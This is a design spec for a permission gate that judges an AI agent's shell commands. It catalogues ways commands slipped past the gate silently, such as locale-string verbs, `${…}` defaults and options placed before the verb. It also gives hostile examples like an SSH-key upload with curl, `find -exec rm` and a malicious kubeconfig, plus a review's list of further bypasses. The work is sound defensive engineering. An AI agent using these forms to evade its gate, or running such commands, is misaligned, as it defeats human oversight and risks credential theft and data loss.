# Spec — close the gate's literal-text gaps (findings F-21 to F-24)

size: medium · profile: library · owner: YpNo · date: 2026-11-13 · revision 2 (challenger pass folded) · built on `main`
`cb96fd1` (gate-substitution, gate-cd-runner and gate-expansion merged)

## Goal

Four gaps that the gate-expansion builds found and parked. Each one is **silent today**
(`cobot-rules check`, owner layer off, 2026-11-13). Each has a wider class behind it, measured
the same day:

| finding | command | bash runs | today | after |
|---|---|---|---|---|
| F-21 | `find . -delete` · `find . -exec rm {} \;` · `find . -fprint x` (`@consultant`) | a delete, a program, a write | silent | ask |
| F-21 class | `cat a > b` · `make x` whose recipe holds `cat a > b` (`@consultant`) | a write | silent | ask |
| F-21 class | `sort -o f` · `uniq a b` · `tree -o f` · `yq -i …` · `fd -x rm` · `git branch -D main` · `curl -s -T ~/.ssh/id_rsa URL` · `zizmor --fix` · `cargo audit fix` · `npm audit --json fix` · `go env -w CC=./x` · `terraform providers lock` (`@consultant`, `@learner`) | a write, an upload or a program | silent | ask |
| F-22 | `kubectl get pods ${x:---kubeconfig=./evil}` · `find ${x:-*}` (`@consultant`) | `--kubeconfig=./evil` · a glob | silent | ask |
| F-22 class | `cargo ${x:-publish}` · `cargo "${x:-publish}"` (main thread) | `cargo publish` | silent | ask |
| F-23 | `cargo $"publish"` · `terraform {$"apply",}` | `cargo publish` · `terraform apply` | silent | deny |
| F-24 | `cargo +nightly publish` · `cargo --locked publish` · `cargo -vv publish` · `rustup run nightly cargo publish` | `cargo publish` | silent | deny |
| F-24 class | `npm --registry x publish` · `pnpm -r publish` · `uv --directory x publish` | a publish | silent | deny |
| F-24 | `rg --pre=./x foo` · `rg --pre=./* foo` · `sort --compress-program=./x` · `git log --output=/tmp/x` (`@consultant`) | a program, a write | silent | ask |

What does not change: the precedence, the gate never emits `allow`, every row of
`DEFAULT_DECISIONS`, every substitution, brace and glob row, the main thread's handling of
options (no read list there), owner-layer allows. These stay silent for `@consultant` and
`@learner`: `find . -name '*.py'`, `rg -n x src`, `sort -u f`, `uniq -c f`, `git log --oneline
-5`, `git branch -a`, `git branch --contains HEAD`, `curl -s https://x | jq -r .tag_name`,
`curl -sfL -H 'Accept: application/json' https://x`, `ls x 2>/dev/null`, `cat a 2>&1`,
`npm audit --json`, `cargo-audit audit`, `tree -L 2`, `yq '.a' f.yaml`.

Out of scope, parked as **F-25**: read-list tools that load repository configuration or build
repository code (`build.rustc-wrapper`, `trivy.yaml`, a `# syntax=` frontend, `pip-audit -r`).
`cargo audit*` and `cargo deny check*` leave the read lists now (Q4): a repository alias shadows
them (cargo 1.99 warns and runs it); `cargo-audit audit*` and `cargo-deny check*` stay.

## Principles check

- Proportionality: medium. One trust boundary (the agent read lists) and two scanner forms, no
  new surface; holds.
- Rules before autonomy: every change fails closed. An unknown option before the verb gives one
  more reading, never fewer. A read-list command with an option the guard does not know keeps
  its read list, as today. `curl` is the exception: it is judged by an allow-list (Q3). Holds.
- Proof not promises: one test row per table line, plus differential rows run under real bash;
  holds.
- Governance (`docs/01-decisions.md`): 6 holds (asks and denies only are added); 20 holds (one
  PR); 22 holds (no dependency); 28 **amended**: "could execute repository content" becomes
  "could execute a program or write a file other than the agent's own output" (owner's yes with
  this spec, Q1: yes). The amendment names the residual: a plain variable (`find $X`) is still
  read as text, the `cargo $V` class, which is safe only because an agent cannot set the
  environment across Bash calls and an assignment in the command asks; 0–5, 7–19, 21, 23–27 not relevant.
- Architecture: plain layering (library profile). The scanner (`bin/_cobot_shell.py`) reads
  forms, `cobot-rules` judges, as in the three predecessor specs.
- New dependencies: none (stdlib only in `bin/`).
- Delivery: one branch `security/gate-findings-21-24` from `main`, one PR; tasks below are the
  commits.

## The model

**A. Agent read guard (F-21, F-24 agent half, Q1).** `executes_foreign` becomes `agent_unsafe`.
It returns the reason a segment never matches an agent-scoped allow, or None. Its existing checks
stay as they are: a non-cosmetic assignment, `git -c`, `--exec-path`, kubeconfig flags and
`FOREIGN_FLAGS`. Three more are added:

1. **Foreign options:** `git --config-env` (sets config from the environment, like `-c`), `cargo
   --config` and `-Z`, and `docker --config` (loads CLI plugins from that directory).
2. **Read guards.** `READ_GUARDS` is keyed by the command word, or by the command word and verb
   for `git`, `cargo`, `npm`, `pnpm`, `go`, `terraform`, `kubectl`, `docker`, `helm`, `trivy` and
   `semgrep`. The verb is read past global options with `strip_global_options`. Both keys are
   looked up: a command-word guard applies whatever the verb is (`semgrep --config p/ci
   --autofix`, where the verb lookup yields `--config`). A guard names
   what makes the command write a file or run a program, in one of three spellings:
   - **getopt** (GNU getopt_long, git parse-options, clap, pflag, click): a long name matches as
     `--name`, `--name=…`, and as any abbreviation (`--outp` is `--output`; any prefix of a
     guarded long name, since GNU sort accepts `--o`).
     This over-reads tools that do not abbreviate, which is stricter. A short letter matches in
     any single-dash cluster (`-uo`, `-fsSLo`). This over-reads a letter inside an attached
     value (`-k1o`), also stricter.
   - **single** (Go's `flag`, `find` predicates): `-name` or `--name`, alone or with `=…`. No
     abbreviation, no clusters.
   - **verbs**: a positional word after the guarded verb (`cargo audit fix`, `npm audit … fix`,
     `terraform providers lock|mirror`). For `uniq`, a second positional is the output file.
     For `git branch`, any positional outside `-l`/`--list`, or any short cluster holding
     `dDmMcCfut`, writes. Values of `--contains`, `--no-contains`, `--merged`, `--no-merged`,
     `--points-at`, `--sort` and `--format` are not positionals. `--color`, `--column` and
     `--abbrev` take a value only with `=`, so `git branch --color auto` creates a branch named
     `auto` and asks, as it should.

   The table, each row with its source (installed `--help` with its version, or the upstream
   reference URL, dated 2026-11-13, in a comment):

   | key | style | guarded |
   |---|---|---|
   | `find` | single | `-delete -rm -exec -execdir -ok -okdir -fprint -fprint0 -fprintf -fls` |
   | `rg` | getopt | `--pre` |
   | `fd` | getopt | `-x --exec -X --exec-batch` |
   | `sort` | getopt | `-o --output --compress-program` |
   | `uniq` | verbs | second positional (value options `-f -s -w --skip-fields --skip-chars --check-chars`) |
   | `tree` | getopt | `-o -R` |
   | `file` | getopt | `-C --compile` |
   | `yq` | getopt | `-i --inplace --in-place -s --split-exp --split-exp-file` |
   | `git log` · `git show` · `git diff` | getopt | `--output` |
   | `git branch` | verbs | as above, plus `--delete --move --copy --force --set-upstream-to --unset-upstream --edit-description --track --no-track --create-reflog` |
   | `zizmor` | getopt | `--fix` |
   | `trivy fs` · `trivy config` · `trivy image` | getopt | `-o --output --module-dir` |
   | `gitleaks detect` | getopt | `-r --report-path --log-opts` |
   | `pip-audit` | getopt | `--fix -o --output` |
   | `cargo-audit audit` | verbs | `fix` |
   | `npm audit` | verbs | `fix` |
   | `pnpm audit` | getopt | `--fix` |
   | `semgrep scan` · `semgrep` | getopt | `-a --autofix -o --output`, and any long name ending in `-output` |
   | `docker build` | getopt | `-o --output --iidfile --metadata-file --push --load` |
   | `docker compose config` | getopt | `-o --output` |
   | `cosign verify` | getopt | `--output-file` |
   | `actionlint` | single | `-shellcheck -pyflakes` |
   | `go list` | single | `-toolexec -exec -mod -modfile` |
   | `go env` | single | `-w -u` |
   | `terraform providers` · `tofu providers` | verbs | `lock mirror` |
   | `kubectl kustomize` · `kustomize build` | getopt | `-o --output` |
   | `helm template` | getopt | `--output-dir --dependency-update` |
   | `kubeconform` | single | `-cache` |

3. **`curl` by allow-list (Q3).** A `curl` segment keeps its read list only when every option is
   on this list: `-s --silent -S --show-error -L --location -f --fail --fail-with-body -I --head
   -i --include -v --verbose -k --insecure -g --globoff --compressed -4 -6 --http1.1 --http2`,
   and with a value `-H --header` (not starting with `@`), `-A --user-agent`, `-e --referer`,
   `-m --max-time`, `--connect-timeout`, `--retry`, `--retry-delay`, `--retry-max-time`, `-r
   --range`, `-X --request` (`GET` or `HEAD`), `--url`, `-w --write-out` (not starting with `@`,
   no `%output{`: curl 8.3 writes a file with it). Clusters are read letter by letter (`-fsSL`,
   `-sH x`); a value letter ends a cluster. The rest are URLs. Uploads and data (`-T -d -F
   --json -b`), writes (`-o -O -D -c --trace --libcurl --stderr --etag-save --hsts --alt-svc`)
   and a config (`-K`) ask.

**Redirection writes.** `Scan` gains `writes`: the targets of `>`, `>>`, `>|`, `&>`, `&>>`, `<>`
and `N>`, and of `>&` when its target is not digits or `-`. `/dev/null`, `/dev/stdout`,
`/dev/stderr`, `/dev/fd/1` and `/dev/fd/2` are left out. A target holding a hole counts.
`command_parts` returns the writes of a runner body too (a make recipe, a mise task, a
package.json script). When the command or any runner body it expands writes, no agent-scoped
allow counts for any of its segments. The verdict note names the cause: `redirection to 'b'
writes a file; the read list does not cover it`, `option '-delete' of find can write or run; the
read list does not cover it`. The main thread is judged as before (protected files only).

**B. Readings past global options (F-24 main half, Q2).** `GLOBAL_OPTIONS` gains `cargo`, from
`cargo --help` 1.99.0. Flags: `-v --verbose -q --quiet --locked --offline --frozen -h --help -V
--version --list`. Value options: `--color -C --config -Z --explain`. A leading `+<toolchain>`
is stripped, as rustup's proxy does. `npm`, `pnpm` and `uv` gain their
value options only (from `uv --help` 0.12.23, `pnpm --help` 12.18.0 and `npm help config`
11.20.0, read 2026-11-13), so a known option's value is never read as a verb. uv: `--color
--allow-insecure-host --directory --project --config-file`. pnpm: `-C --dir --reporter --loglevel
-F --filter --filter-prod --env-file --store-dir --state-dir --npmrc-auth-file
--workspace-packages --registry --https-proxy --http-proxy --no-proxy`. npm: `--registry
--prefix -w --workspace --userconfig --globalconfig --cache --loglevel --tag --access --otp
--include --omit`. `candidates` adds **readings** for `never` and `ask` rows. One walk covers
the tokens after the command word. A known value option skips its value, a known flag or any
`--opt=value` skips itself, and `--` ends the options (the next word is the verb). An **unknown**
option (`-…` or `+…`) followed by a word records that word as one possible verb and **continues
the walk after it**, reading it as the option's value. So `npm --registry=x --tag=y publish`,
`pnpm --filter x -r publish` and `uv --config-file y --directory x publish` all reach
`publish`. The walk ends at the first word that no option can own. Each recorded verb gives one
reading: the command word plus the tokens from that verb on, put through the same
canonicalisers. Allows
still match only the canonical form (`forms[-1]`, unchanged), so a reading can only add a deny
or an ask. `rustup run [--install] <toolchain> <cmd…>` joins `WRAPPER_PARSERS` as an entry
wrapper. A known cost, written in `docs/configuration.md` with a test row: an **unknown** value
option whose value is a ruled verb reads as that verb. `npm --some-new-option publish test`
denies, and the owner layer cannot lift a `never`. The tables above keep the known options out
of it (`npm -w publish ls` and `npm --loglevel publish ls` stay silent).

**C. `${…}` operator words are holes (F-22).** In `parameter()`, a `${…}` whose content is not
plain becomes a `substitution` hole, with no body. `quoted` is set when it sits inside double
quotes. Plain means a name, a positional or special parameter, `#` or `!` before one, or a
subscript `name[…]`. Every operator (`:-`, `-`, `:=`, `=`, `:+`, `+`, `:?`, `?`, `#`, `##`, `%`,
`%%`, `/`, `//`, `^`, `,`, `:off:len`, `@op`) makes a hole. Substitutions inside the word keep
their own holes, with their bodies judged. The value is unknown: the variable may be set. An
unquoted hole is split and globbed, so agent allows never count on it (`agent_globs` →
`never`). In the verb zone it is structural, and in the tail the `never` viability check
applies. `${x}`, `$x` and `${#x}` are unchanged: a variable's value stays the
out-of-scope class of `cargo $V`.

**D. `$"…"` is a locale string (F-23).** In the quoting modes, `$"…"` is scanned as `"…"`. It
becomes a `quoted` substitution hole with no body whose `value` is the untranslated text, when
that text holds no `$`, backtick or backslash (otherwise None). `judge_segment` already judges
both the hole (`cargo <hole>`: structural, ask) and the known value (`cargo publish`: deny), and
the stricter wins. A message catalogue may translate the text into anything, which the hole
covers. Inside a brace alternative it is scanned the same way (`terraform {$"apply",}`). Inside
`"…"` and here-documents `$"` stays literal, as in bash.

## Stories and acceptance

1. As the owner, a read-only agent cannot write or run through its read list. Accept: every
   `@consultant` row of *Goal* asks with the guard or redirection reason, for `@learner` too;
   `make x` with a writing recipe asks; `semgrep --config p/ci --autofix` and `semgrep scan
   --sarif-output=x` ask. The silent list of *Goal* stays silent (`pytest -k
   "agent or guard"`).
2. As the owner, `${…}` operator words are judged. Accept: `kubectl get pods
   ${x:---kubeconfig=./evil}` and `find ${x:-*}` ask for `@consultant`; `cargo ${x:-publish}`
   and `cargo "${x:-publish}"` ask; `echo "${x:-default}"`, `cd "${dir:-.}"` and
   `ls ${HOME}` stay silent on the main thread (`-k parameter`).
3. As the owner, locale strings hide nothing. Accept: `cargo $"publish"`, `terraform
   {$"apply",}` and `git push $"--force"` deny; `echo $"hello"` stays silent;
   `cat(){ :; }; cargo $"publish"` asks, because a `cat` definition turns known values off
   (`-k locale`).
4. As the owner, global options never hide a ruled verb. Accept: every F-24 main-thread row of
   *Goal* denies, as do `cargo --color always publish`, `cargo -C .. publish` and `pnpm --filter
   x publish`, `npm --registry=x --tag=y publish`, `pnpm --filter x -r publish`, `uv --config-file
   y --directory x publish` and `cargo +nightly --color=always -vv publish` deny; `cargo -C
   publish build`, `npm -w publish ls` and `npm --loglevel publish ls` stay silent (known value
   options); `npm --zz publish test` denies (the documented cost);
   `git -C x log` stays silent (`-k readings`).
5. As a maintainer, the scanner matches bash. Accept: `tests/test_cobot_shell.py` rows for
   `$"…"` (value, holes inside, in `"…"`, in a here-document, in a brace alternative), `${…}`
   plain and operator forms, nested `${x:-$(y)}`, and `writes` for each operator and the
   `/dev/null` and `2>&1` exclusions (`pytest tests/test_cobot_shell.py`).
6. As a maintainer, the gate agrees with bash. Accept: the rows of stories 2 to 4 join
   `BYPASSES_CLOSED`. `tests/test_gate_differential.py` runs them under bash with stubs for
   `rustup`, `rg`, `uniq`, `sort` and `find`, which use builtins only. Its docstring drops the
   F-21 limitation (`pytest tests/test_gate_differential.py`).
7. As the owner, the full gate passes. Accept: the verified commands of `.agent/CONTEXT.md`
   (pytest with the 85 % floor, ruff check and format, shellcheck, markdownlint, both `claude
   plugin validate --strict`, `python3 -I scripts/check-plugin.py`).

## Clarify

Answers from the owner, 2026-11-13; each recommended option was chosen.

- Q1 Scope of F-21: a) the named options only · **b) the whole class**: every read-list
  command's write and run options, redirection writes, decision 28 amended.
- Q2 Scope of F-24: a) `cargo` only · **b) readings for every command word** (npm, pnpm and uv
  publish too).
- Q3 `curl`: **a) an allow-list of read options** · b) drop `curl -s*` · c) a deny-list.
- Q4 Repository configuration: a) park all · **b) drop `cargo audit*` and `cargo deny check*`
  now**, park the rest as F-25; `cargo audit` asks for both agents.

## Plan

Scanner forms first (D, C, `writes`), then readings (B), then the guard (A), each test-first;
then differential rows, docs, and an independent bypass-aimed review whose findings are folded
in a commit of their own (T07).

## Tasks

| id | task | lane | risk | deps |
|---|---|---|---|---|
| T01 | `_cobot_shell.py`: `$"…"` locale hole with value; `${…}` operator hole; `test_cobot_shell.py` rows | scanner | trust boundary | — |
| T02 | `_cobot_shell.py`: `Scan.writes`; `cobot-rules` `command_parts` carries writes; shell rows | scanner | trust boundary | T01 |
| T03 | `cobot-rules`: readings in `candidates`, `GLOBAL_OPTIONS["cargo"]`, `+toolchain`, `inner_rustup`; rows | gate | trust boundary | — |
| T04 | `cobot-rules`: `agent_unsafe` with foreign options, `READ_GUARDS`, curl allow-list, writes, reason notes; Q4 rows in `default.rules`; rows | gate | trust boundary | T02 |
| T05 | `test_gate_differential.py`: rows of T01–T04, stubs, docstring | tests | — | T01–T04 |
| T06 | docs, CHANGELOG, decision 28 amendment, F-25 parked, findings closed | docs | — | T05 |
| T07 | bypass review folds | gate | trust boundary | T06 |

After each code commit, a journal-only commit carries `verified: <sha> · …`, checked with
`python3 -I plugins/cobot/bin/cobot-memory stamp`.

## Trade-offs

- A deny-list per command over an allow-list (except curl): an allow-list would ask on most
  real `rg`, `find` and `git log` calls. A deny-list misses an option that is added later; each
  row cites its dated source so a knowledge refresh can re-check it.
- Over-reading options (abbreviations, letters in clusters) over parsing each tool exactly: a
  false ask costs one prompt, while a false silence costs the trust boundary.
- Writes anywhere disable agent allows for the whole command, not per segment (a cheap ask).

## Challenger verdict

2026-11-13, challenger: **SOUND WITH CHANGES**, no silent bypass in the design (checked clear:
redirections, the curl allow-list, guards, `${…}`, foreign options). Folded:

- MAJOR readings must continue past several unknown and `=` options: the walk records each
  possible verb and continues; story 4 rows `npm --registry=x --tag=y publish` and two others.
- MAJOR reading denies are unrecoverable: npm, pnpm and uv value-option tables, and the
  residual cost (an unknown value option) documented with a row.
- MINOR `$"…"` asks rather than denies under a `cat` definition: a story 3 row.
- MINOR the semgrep command-word guard must apply when the verb lookup yields an option: both
  keys are looked up; story 1 rows.
- MINOR `git branch --color auto`: git takes an optional value only with `=`, so `auto` is a
  new branch and the ask is correct; written in the guard.
- Residual, owner-scoped: `find $X` with an inherited variable is named in the decision 28
  amendment.

## Converge

2026-11-13, T01–T06 built (`7c55eec`, `00d4c30`, `c55624f`, `afd6724`, `1014792` and the docs commit).
Folded while building: a runner verb behind an option was invisible too (`uv -q run cargo
publish`, `pnpm -C x exec …`, `npm --prefix x test`): `is_opaque` reads every reading, so these
ask (T03). Spec rows corrected: `curl -fsSL` never matched the `curl -s*` read row, so the silent
example is `curl -sfL`; abbreviations take any prefix (GNU sort accepts `--o`); `npm -w publish
test` asks as an npm script, so the silent example is `npm -w publish ls`. The differential
proves the decomposition (`${…}`, `$"…"`); the guard, readings and redirection writes are
proved by unit rows, each failing with its mechanism off. F-21 to F-24 closed, F-25 parked.
Bypass-aimed review (code-reviewer, 2026-11-14, bash 5.2.37 and the installed tools, 18 000
fuzzed commands, no crash): 4 BLOCKER, 5 MAJOR, 1 MINOR, all folded in T07. Agent read rows
lacked a word boundary (`cat*` covered `catatonit`, `git diff*` `git difftool -x`); `rustup
run <path>` and `cargo +<path>` ran a repository's `bin/`; `rg --hostname-bin`, `cargo-deny
check -g`, `cargo-audit audit --db`, a globbed `uniq` operand and `--no-list` were unguarded;
the new value tables widened the canonical form agents match (`npm --cache ./x audit`), now
foreign; `rustup run nightly -- cargo publish`, `npm publ`, `pnpm recursive publish` and `git -c
alias.p=…` hid a ruled verb; the readings read an argument as a verb (`uv -q run publish.py`
denied) and now continue past a value only when an option follows. Accepted: a runner behind an
option asks as opaque (`pnpm -r build`).
